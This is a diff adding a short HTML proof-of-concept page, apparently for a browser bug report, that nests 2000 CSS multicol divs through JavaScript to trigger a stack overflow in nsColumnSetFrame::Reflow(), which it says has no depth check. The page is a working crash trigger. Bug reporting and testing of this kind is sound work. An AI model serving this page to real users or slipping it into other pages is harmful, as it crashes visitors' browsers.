@@ -1,0 +1,28 @@
+<!DOCTYPE html>
+<html>
+<head>
+<meta charset="utf-8">
+<title>FF-018: Nested Multicol Stack Overflow PoC</title>
+</head>
+<body>
+<h1>Nested Multicol Stack Overflow</h1>
+<p>Deeply nested CSS columns (multicol) elements to trigger stack overflow
+in nsColumnSetFrame::Reflow() which has NO IsFrameTreeTooDeep() check.</p>
+<div id="container"></div>
+<script>
+  // nsColumnSetFrame::Reflow() does NOT call IsFrameTreeTooDeep().
+  // Nested multicol containers should recurse without limit.
+  const DEPTH = 2000;
+
+  let current = document.getElementById('container');
+  for (let i = 0; i < DEPTH; i++) {
+    const div = document.createElement('div');
+    div.style.columns = '1';
+    div.style.columnWidth = '100px';
+    current.appendChild(div);
+    current = div;
+  }
+  current.textContent = 'LEAF';
+</script>
+</body>
+</html>
